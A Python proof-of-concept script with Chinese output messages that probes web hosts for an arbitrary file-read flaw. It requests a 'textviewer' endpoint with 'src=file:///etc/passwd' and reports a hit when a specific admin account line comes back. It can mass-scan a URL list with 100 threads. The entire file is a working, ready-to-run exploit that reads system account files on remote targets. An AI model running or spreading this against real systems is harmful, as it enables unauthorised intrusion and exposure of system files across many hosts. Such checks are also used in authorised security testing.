import requests,argparse,sys
from multiprocessing.dummy import Pool

def poc(target):
    payload="/index.php?mod=textviewer&src=file:///etc/passwd"
    res1=requests.get(url=target,timeout=5)
    try:
        if res1.status_code==200:
            res2=requests.get(url=target+payload,verify=False,timeout=5)
            if "admin:x:1024:100:System default user:/var/services/homes/admin:/bin/sh" in res2.text:
                print('[+]有洞！')
            else:
                print('[-]无洞')
        else:
            print("[*]该网页无法连接")
    except:
        pass

def main():

    parse=argparse.ArgumentParser(description="文件读取漏洞检测")

    parse.add_argument('-u','--url',type=str,dest='url',help="请输入网址")
    parse.add_argument('-f','--file',type=str,dest='file',help="请输入文件路径")

    args=parse.parse_args()

    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list=[]
        with open(args.file,"r",encoding="utf-8")as fp:
            for i in fp.readlines():
                url_list.append(i.strip())
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f'提示：python {sys.argv[0]} -h')

if __name__ =="__main__":
    main()
    


